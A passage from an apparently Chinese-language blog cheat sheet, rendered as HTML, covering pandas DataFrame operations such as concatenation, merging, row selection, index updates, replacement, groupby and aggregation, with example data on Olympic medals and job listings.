class="line">pd.concat([train,val],ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">df = pd.concat([train,val]).reset_index()</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">train.append(val).reset_index()</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">train.append(val,ignore_index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据 key 连接 left 和 right</span></span><br><span class="line">pd.merge(left, right, on=<span class="string">'key'</span>)</span><br><span class="line"><span class="comment"># 根据 key1 和 key2 连接 left 和 right</span></span><br><span class="line">pd.merge(left, right, on=[<span class="string">'key1'</span>, <span class="string">'key2'</span>])</span><br><span class="line"><span class="comment"># 根据left的key列和right的index合并</span></span><br><span class="line">pd.merge(left1, right1, left_on=<span class="string">'key'</span>, right_index=<span class="literal">True</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">how 可以设置</span></span><br><span class="line"><span class="string">right、left: 左外，右外</span></span><br><span class="line"><span class="string">outer、inner: 全外连接，内连接</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">pd.merge(left, right, how=<span class="string">'left'</span>, on=[<span class="string">'key1'</span>, <span class="string">'key2'</span>])</span><br><span class="line"><span class="comment"># 重新产生数据</span></span><br><span class="line">left.join(right, on=[<span class="string">'key1'</span>, <span class="string">'key2'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拼接 df1、df2、df3，同时新增一个索引（x、y、z）来区分不同的表数据来源</span></span><br><span class="line">pd.concat([df1, df2, df3], keys=[<span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入行</span></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">'A'</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>],<span class="string">'B'</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>]&#125;)</span><br><span class="line">c = pd.DataFrame(&#123;<span class="string">'A'</span>:[<span class="number">5</span>],<span class="string">'B'</span>:[<span class="number">5</span>]&#125;)</span><br><span class="line">a = df.iloc[:<span class="number">2</span>,:]</span><br><span class="line">b = df.iloc[<span class="number">2</span>:,:]</span><br><span class="line">df = pd.concat([a,c,b])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除第一行</span></span><br><span class="line">df.drop(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 条件删除</span></span><br><span class="line">df.drop(df[df.金牌数&lt;<span class="number">20</span>].index)</span><br><span class="line">data =  data.drop(index = data[(data.ZH_Term_len == <span class="number">0</span>)].index.tolist())</span><br><span class="line"><span class="comment"># 提取倒数后三列的10-20行</span></span><br><span class="line">df.iloc[<span class="number">10</span>:<span class="number">20</span>,<span class="number">-3</span>:]</span><br><span class="line">df.loc[<span class="number">10</span>:<span class="number">20</span>, <span class="string">'总分'</span>:] </span><br><span class="line"><span class="comment"># 提取第 10 行 </span></span><br><span class="line"><span class="comment"># DataFrame格式</span></span><br><span class="line">a = df.loc[<span class="number">9</span>:<span class="number">9</span>]</span><br><span class="line"><span class="comment"># Series格式</span></span><br><span class="line">a = df.loc[<span class="number">9</span>,:]</span><br><span class="line"><span class="comment"># 提取第 10 行之后的全部行</span></span><br><span class="line">df.iloc[<span class="number">9</span>:,]</span><br><span class="line">df.iloc[<span class="number">9</span>:]</span><br><span class="line"><span class="comment"># 提取 0-50 行，间隔为 3</span></span><br><span class="line">df[:<span class="number">50</span>:<span class="number">3</span>]</span><br><span class="line"><span class="comment"># 提取 金牌数 不等于 10 的行</span></span><br><span class="line">df.loc[~(df[<span class="string">'金牌数'</span>] == <span class="number">10</span>)]</span><br><span class="line"><span class="comment"># 提取奇数行</span></span><br><span class="line">df[[i%<span class="number">2</span>==<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(df.index))]]</span><br><span class="line"><span class="comment"># 提取 中国、美国、英国、日本、巴西 五行数据 且 金牌数小于30</span></span><br><span class="line">df.loc[(df[<span class="string">'金牌数'</span>] &lt; <span class="number">30</span>) &amp; (df[<span class="string">'国家奥委会'</span>].isin([<span class="string">'中国'</span>,<span class="string">'美国'</span>,<span class="string">'英国'</span>,<span class="string">'日本'</span>,<span class="string">'巴西'</span>]))]</span><br><span class="line"><span class="comment"># 包含某个字的行</span></span><br><span class="line">df[df.国家奥委会.str.contains(<span class="string">'国'</span>)]</span><br><span class="line"><span class="comment"># 提取 第 0-2 行第 0-2 列</span></span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">df.iloc[<span class="number">0</span>:<span class="number">2</span>,[<span class="number">0</span>,<span class="number">1</span>]]</span><br><span class="line"><span class="comment"># 使用 query 提取 金牌数 + 银牌数 大于 15 的国家</span></span><br><span class="line">df.query(<span class="string">'金牌数+银牌数 &gt; 15'</span>)</span><br><span class="line"><span class="comment"># 使用 query 提取 金牌数 大于 金牌均值的国家</span></span><br><span class="line">gold_mean = df[<span class="string">'金牌数'</span>].mean()</span><br><span class="line">df.query(<span class="string">f'金牌数 &gt; <span class="subst">&#123;gold_mean&#125;</span>'</span>)</span><br><span class="line"><span class="comment"># 指定位置插入行</span></span><br><span class="line">df1 = df.iloc[:<span class="number">1</span>, :]</span><br><span class="line">df2 = df.iloc[<span class="number">1</span>:, :]</span><br><span class="line">df3 = pd.DataFrame([[i <span class="keyword">for</span> i <span class="keyword">in</span> range(len(df.columns))]], columns=df.columns)</span><br><span class="line">df_new = pd.concat([df1, df3, df2], ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 调整 顺序</span></span><br><span class="line">q4_df = q4_df.reindex([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">22</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>]).reset_index()</span><br><span class="line"><span class="comment"># 可以调整列的顺序</span></span><br><span class="line">ans.reindex([<span class="string">'installs总数'</span>,<span class="string">'contentRating最多的类型'</span>,<span class="string">'contentRating最多类型百分比'</span>,<span class="string">'score平均分'</span>],axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 换顺序</span></span><br><span class="line">cpn_bz.iloc[[<span class="number">2</span>,<span class="number">3</span>]]=cpn_bz.iloc[[<span class="number">3</span>,<span class="number">2</span>]]</span><br></pre></td></tr></table></figure><h3><span id="create">Create</span></h3><ul><li>创建DataFrame</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 list 生成</span></span><br><span class="line">nums = np.array([i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">31</span>)]).reshape(<span class="number">10</span>,<span class="number">3</span>)</span><br><span class="line">colu = [<span class="string">f'col_<span class="subst">&#123;i&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>)]</span><br><span class="line">inde = [<span class="string">f'row_<span class="subst">&#123;i&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]  </span><br><span class="line">pd.DataFrame(data=nums,index=Finde,columns=colu)</span><br><span class="line"><span class="comment"># 使用 dict 生成，索引自动生成</span></span><br><span class="line">hight = np.random.randint(<span class="number">158</span>,<span class="number">180</span>,<span class="number">10</span>)</span><br><span class="line">weight = np.random.randint(<span class="number">49</span>,<span class="number">75</span>,<span class="number">10</span>)</span><br><span class="line">pd.DataFrame(data=&#123;</span><br><span class="line">    <span class="string">'hight'</span>:hight,</span><br><span class="line">    <span class="string">'weight'</span>:weight,&#125;</span><br><span class="line">)      <span class="comment"># 这里没有设置索引，会自动生成</span></span><br><span class="line"><span class="comment"># 读取excel sheet_name默认是0，传入数字就是读取第x+1个sheet，传入字符串就是查找对于sheet的名字</span></span><br><span class="line">df = pd.read_excel(<span class="string">'data/2020年销售数据.xlsx'</span>,sheet_name=<span class="number">0</span>) </span><br><span class="line"><span class="comment"># 读取csv文件，默认编码utf-8，遇到中文乱码可以试试看gbk</span></span><br><span class="line">df = pd.read_csv(<span class="string">'data/2018年北京积分落户数据.csv'</span>,encoding=<span class="string">'gbk'</span>)  <span class="comment"># encoding参数指定数据的编码方式为utf-8</span></span><br></pre></td></tr></table></figure><h3><span id="del">Del</span></h3><ul><li>删除某列的数据<ul><li><strong>axis</strong>：轴。0 或 ‘index’，表示按行删除；1或’columns’，表示按列删除。</li></ul></li></ul>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># del 只能删一行</span></span><br><span class="line"><span class="keyword">del</span> df[<span class="string">'a'</span>]</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">df.drop(<span class="string">'a'</span>,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="update">Update</span></h3><ul><li>where操作</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果一个国家的金牌数大于 30 则值为 是，反之为 否</span></span><br><span class="line">df[<span class="string">'金牌大于30'</span>]  = np.where(df[<span class="string">'金牌数'</span>] &gt; <span class="number">30</span>, <span class="string">'是'</span>, <span class="string">'否'</span>)</span><br></pre></td></tr></table></figure><ul><li><p>更新索引</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 索引从1开始</span></span><br><span class="line">df.set_index(x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,df.shape[<span class="number">0</span>]+<span class="number">1</span>))</span><br><span class="line"><span class="comment"># 使用某列作为索引，默认删除该列 即drop=True</span></span><br><span class="line">df.set_index(<span class="string">'date'</span>)</span><br><span class="line"><span class="comment"># 修改索引名 如果是多个索引可以通过[]传入</span></span><br><span class="line">df.rename_axis(<span class="string">'日期'</span>)</span><br><span class="line"><span class="comment"># 指定多个索引</span></span><br><span class="line">df=df.set_index([<span class="string">'date'</span>,<span class="string">'val'</span>])</span><br><span class="line"><span class="comment"># 修改单个索引名</span></span><br><span class="line">df.rename_axis(index=&#123;<span class="string">'val'</span>:<span class="string">'v'</span>&#125;)</span><br><span class="line"><span class="comment"># 还原索引，使用pandas生成默认索引</span></span><br><span class="line">df.reset_index()</span><br><span class="line"><span class="comment"># 删除索引</span></span><br><span class="line">df.reset_index(drop=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li><li><p>replace</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将金牌数列的数字 0 替换为 无</span></span><br><span class="line">df[<span class="string">'金牌数'</span>].replace(<span class="number">0</span>,<span class="string">'无'</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#同时替换 1将 无 替换为 缺失值 2将 0 替换为 None</span></span><br><span class="line">df.replace([<span class="string">'无'</span>,<span class="number">0</span>],[np.nan,<span class="string">'None'</span>],inplace = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Series中replace字符串部分需要加上.str. 支持链式编程</span></span><br><span class="line">df.employmentLength.str.replace(<span class="string">'years'</span>,<span class="string">''</span>).str.replace(<span class="string">'+'</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># lambda 和 str</span></span><br><span class="line">df.price = df.price.str.replace(<span class="string">'[$|,]'</span>,<span class="string">''</span>).astype(<span class="string">'float'</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">df.price = df.price.apply(<span class="keyword">lambda</span> x:x.replace(<span class="string">'$'</span>,<span class="string">''</span>).replace(<span class="string">','</span>,<span class="string">''</span>)).astype(<span class="string">'float'</span>)</span><br></pre></td></tr></table></figure></li></ul><ul><li>fill</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bfill 从后面往前填充</span></span><br><span class="line"><span class="string">ffill 从前往后</span></span><br><span class="line"><span class="string">默认列方向填充0，1使用行方向</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新增一列 最多奖牌数量 列，值为该国 金、银、铜 牌数量中最多的一个奖牌数量</span></span><br><span class="line">df[<span class="string">'最多奖牌数量'</span>] = df.bfill(<span class="number">1</span>)[[<span class="string">"金牌数"</span>, <span class="string">"银牌数"</span>,<span class="string">'铜牌数'</span>]].max(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li><h3><span id="retrieve">Retrieve</span></h3></li><li><p>随机返回n个样本</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.sample(n)</span><br></pre></td></tr></table></figure><ul><li>pivot与groupby</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pd.pivot_table(df2,values = [<span class="string">'奖牌类型'</span>],index = [<span class="string">'国家'</span>,<span class="string">'运动类别'</span>],aggfunc = <span class="string">'count'</span>)</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">pd.DataFrame(df2.groupby([<span class="string">'国家'</span>,<span class="string">'运动类别'</span>]).count()[<span class="string">'奖牌类型'</span>])</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">df2.groupby([<span class="string">'国家'</span>,<span class="string">'运动类别'</span>]).count()[[<span class="string">'奖牌类型'</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># groupby 联合 apply</span></span><br><span class="line">q2[<span class="string">'恋爱的男生比例'</span>] = df[df[<span class="string">'romantic'</span>]==<span class="string">'yes'</span>].groupby(<span class="string">'age'</span>).apply(<span class="keyword">lambda</span> x:x.sex==<span class="string">'M'</span>).groupby(<span class="string">'age'</span>).sum()/q2_rom.groupby(<span class="string">'age'</span>).count()[<span class="string">'sex'</span>]</span><br><span class="line"><span class="comment"># 相当于在[]里面写条件</span></span><br><span class="line">df[df[<span class="string">'smoker'</span>]==<span class="string">'yes'</span>].groupby(<span class="string">'age区间'</span>).count()</span><br><span class="line"><span class="comment"># count和sum有区别，一个是计算bool后求和，一个在条件筛选后求个数</span></span><br><span class="line">df.groupby(<span class="string">'age区间'</span>).apply(<span class="keyword">lambda</span> x:x.smoker==<span class="string">'yes'</span>).groupby(<span class="string">'age区间'</span>).sum()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把groupby的元素取出来</span></span><br><span class="line">pieces = dict(list(df.groupby(<span class="string">'key1'</span>)))</span><br><span class="line">pieces[<span class="string">'b'</span>]</span><br><span class="line"><span class="comment"># groupby 使用字典</span></span><br><span class="line">by_column = people.groupby(mapping, axis=<span class="number">1</span>)</span><br><span class="line">by_column.sum()</span><br></pre></td></tr></table></figure><ul><li>unstack</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算前十名各国每日奖牌数量合计</span></span><br><span class="line"><span class="comment"># 注意：对于第一天没有数据的国家用0填充，其余时间的缺失值用上一日数据填充</span></span><br><span class="line">countries = df2.groupby(<span class="string">'国家'</span>).count().sort_values(<span class="string">'奖牌类型'</span>,ascending=<span class="literal">False</span>).head(<span class="number">10</span>).index.tolist()</span><br><span class="line">tmp = df2[df2[<span class="string">'国家'</span>].isin(countries)]</span><br><span class="line">tmp.groupby([<span class="string">'获奖时间'</span>,<span class="string">'国家'</span>]).count()[<span class="string">'奖牌类型'</span>].unstack().cumsum().fillna(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 对于两层的Series </span></span><br><span class="line">data = pd.Series(np.random.randn(<span class="number">9</span>),</span><br><span class="line">                 index=[[<span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'d'</span>],</span><br><span class="line">                        [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>]])</span><br><span class="line"><span class="comment"># 选第二个索引值的操作：</span></span><br><span class="line">data[:,<span class="number">2</span>]</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">data.unstack().iloc[:,<span class="number">1</span>]</span><br></pre></td></tr></table></figure><ul><li>数据聚合</li></ul><table><thead><tr><th align="right">positionName</th><th align="right">companySize</th><th align="right">industryField</th><th align="right">financeStage</th><th align="right">companyLabelList</th><th align="right">firstType</th><th align="right">secondType</th><th align="right">thirdType</th><th align="right">createTime</th><th align="right">district</th><th align="right">salary</th><th align="right">workYear</th><th align="right">jobNature</th><th align="right">education</th><th align="right">positionAdvantage</th><th align="right">imState</th><th align="right">score</th><th align="right">matchScore</th><th align="right">famousCompany</th><th align="right">Hobby</th><th></th></tr></thead><tbody><tr><td align="right">0</td><td align="right">数据分析</td><td align="right">50-150人</td><td align="right">移动互联网,电商</td><td align="right">A轮</td><td align="right">[‘绩效奖金’, ‘带薪年假’, ‘定期体检’, ‘弹性工作’]</td><td align="right">产品|需求|项目类</td><td align="right">数据分析</td><td align="right">数据分析</td><td align="right">2020/3/16 11:00</td><td align="right">余杭区</td><td align="right">37500</td><td align="right">1-3年</td><td align="right">全职</td><td align="right">本科</td><td align="right">五险一金、弹性工作、带薪年假、年度体检</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td align="right">False</td><td>‘绩效奖金’</td></tr><tr><td align="right">0</td><td align="right">数据分析</td><td align="right">50-150人</td><td align="right">移动互联网,电商</td><td align="right">A轮</td><td align="right">[‘绩效奖金’, ‘带薪年假’, ‘定期体检’, ‘弹性工作’]</td><td align="right">产品|需求|项目类</td><td align="right">数据分析</td><td align="right">数据分析</td><td align="right">2020/3/16 11:00</td><td align="right">余杭区</td><td align="right">37500</td><td align="right">1-3年</td><td align="right">全职</td><td align="right">本科</td><td align="right">五险一金、弹性工作、带薪年假、年度体检</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td align="right">False</td><td>‘带薪年假’</td></tr><tr><td align="right">0</td><td align="right">数据分析</td><td align="right">50-150人</td><td align="right">移动互联网,电商</td><td align="right">A轮</td><td align="right">[‘绩效奖金’, ‘带薪年假’, ‘定期体检’, ‘弹性工作’]</td><td align="right">产品|需求|项目类</td><td align="right">数据分析</td><td align="right">数据分析</td><td align="right">2020/3/16 11:00</td><td align="right">余杭区</td><td align="right">37500</td><td align="right">1-3年</td><td align="right">全职</td><td align="right">本科</td><td align="right">五险一金、弹性工作、带薪年假、年度体检</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td align="right">False</td><td>‘定期体检’</td></tr><tr><td align="right">0</td><td align="right">数据分析</td><td align="right">50-150人</td><td align="right">移动互联网,电商</td><td align="right">A轮</td><td align="right">[‘绩效奖金’, ‘带薪年假’, ‘定期体检’, ‘弹性工作’]</td><td align="right">产品|需求|项目类</td><td align="right">数据分析</td><td align="right">数据分析</td><td align="right">2020/3/16 11:00</td><td align="right">余杭区</td><td align="right">37500</td><td align="right">1-3年</td><td align="right">全职</td><td align="right">本科</td><td align="right">五险一金、弹性工作、带薪年假、年度体检</td><td align="right">today</td><td align="right">233</td><td align="right">15.101875</td><td align="right">False</td><td>‘弹性工作’</td></tr><tr><td align="right">1</td><td align="right">数据建模</td><td align="right">150-500人</td><td align="right">电商</td><td align="right">B轮</td><td align="right">[‘年终奖金’, ‘做五休二’, ‘六险一金’, ‘子女福利’]</td><td align="right">开发|测试|运维类</td><td align="right">数据开发</td><td align="right">建模</td><td align="right">2020/3/16 11:08</td><td align="right">滨江区</td><td align="right">15000</td><td align="right">3-5年</td><td align="right">全职</td><td align="right">本科</td><td align="right">六险一金,定期体检,丰厚年终</td><td align="right">disabled</td><td align="right">176</td><td align="right">32.559414</td><td align="right">False</td><td>‘年终奖金’</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">分组</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 分组，但不作为索引</span></span><br><span class="line">df.groupby(<span class="string">"district"</span>, as_index=<span class="literal">False</span>)[<span class="string">'salary'</span>].mean()</span><br><span class="line"><span class="comment"># 分组 pandas.core.series.Series 格式</span></span><br><span class="line">df.groupby(<span class="string">"district"</span>)[<span class="string">'salary'</span>].mean()</span><br><span class="line">df[<span class="string">'salary'</span>].groupby(df[<span class="string">'district'</span>]).mean() </span><br><span class="line"><span class="comment"># 分组 pandas.core.frame.DataFrame 格式</span></span><br><span class="line">df.groupby(<span class="string">"district"</span>)[<span class="string">'salary'</span>].mean().to_frame()</span><br><span class="line">df.groupby(<span class="string">"district"</span>)[[<span class="string">'salary'</span>]].mean()</span><br><span class="line">df[[<span class="string">'district'</span>,<span class="string">'salary'</span>]].groupby(<span class="string">'district'</span>).mean()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相同的结果</span></span><br><span class="line">df[<span class="string">'salary'</span>].groupby([df[<span class="string">'workYear'</span>],</span><br><span class="line">                      df[<span class="string">'education'</span>]]).mean()</span><br><span class="line">df.groupby([<span class="string">'workYear'</span>, <span class="string">'education'</span>]).mean()[<span class="string">'salary'</span>]</span><br><span class="line">df.groupby([<span class="string">'workYear'</span>, <span class="string">'education'</span>])[<span class="string">'salary'</span>].mean()</span><br><span class="line">df.groupby([<span class="string">'workYear'</span>, <span class="string">'education'</span>])[<span class="string">'salary'</span>].agg(<span class="string">'mean'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># groupby 用字典</span></span><br><span class="line"><span class="comment">#将 score 和 matchScore 的和记为总分，与 salary 列同时进行分组，并查看结果</span></span><br><span class="line">df.groupby(&#123;<span class="string">'salary'</span>:<span class="string">'薪资'</span>,<span class="string">'score'</span>:<span class="string">'总分'</span>,<span class="string">'matchScore'</span>:<span class="string">'总分'</span>&#125;, axis=<span class="number">1</span>).sum()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分组计算不同行政区，薪水的最小值、最大值和平均值</span></span><br><span class="line">df.groupby(<span class="string">'district'</span>)[<span class="string">'salary'</span>].agg([min, max, np.mean])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对不同行政区进行分组，并统计薪水的均值、中位数、方差，以及得分的均值</span></span><br><span class="line">df.groupby(<span class="string">'district'</span>).agg(</span><br><span class="line">    &#123;<span class="string">'salary'</span>: [np.mean, np.median, np.std], <span class="string">'score'</span>: np.mean&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#对不同岗位(positionName)进行分组，并统计其薪水(salary)中位数和得分(score)均值</span></span><br><span class="line">df.groupby(<span class="string">'positionName'</span>).agg(&#123;<span class="string">'salary'</span>: np.median, <span class="string">'score'</span>: np.mean&#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">统计每个区不同大小公司个数</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 方式1：groupby</span></span><br><span class="line">df.groupby([<span class="string">'district'</span>,<span class="string">'companySize'</span>])[<span class="string">'companySize'</span>].count()</span><br><span class="line"><span class="comment"># 方式2：value_counts() 排序按照个数降序</span></span><br><span class="line">df.groupby(<span class="string">"district"</span>)[<span class="string">'companySize'</span>].value_counts()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看group的结果</span></span><br><span class="line">df.groupby([<span class="string">"district"</span>,<span class="string">'salary'</span>]).groups</span><br><span class="line"><span class="comment"># 将数据按照 district、salary 进行分组，并查看西湖区薪资为 30000 的工作</span></span><br><span class="line">df.groupby([<span class="string">"district"</span>,<span class="string">'salary'</span>]).get_group((<span class="string">"西湖区"</span>,<span class="number">30000</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">我们将会用到 transform 而不是 apply或者mean。 原因是， transform 将会保持 dataframe 矩阵的形状(shape)(就是行列数不变)而 apply 会改变矩阵的形状。</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 在原数据框 df 新增一列，数值为该区的平均薪资水平</span></span><br><span class="line">df[<span class="string">'该区平均工资'</span>] = df[[<span class="string">'district'</span>,<span class="string">'salary'</span>]].groupby(by=<span class="string">'district'</span>).transform(<span class="string">'mean'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算各行政区的企业领域（industryField）包含电商的总数</span></span><br><span class="line">df.groupby(<span class="string">'district'</span>)[<span class="string">"industryField"</span>].apply(<span class="keyword">lambda</span> x: x.str.contains(<span 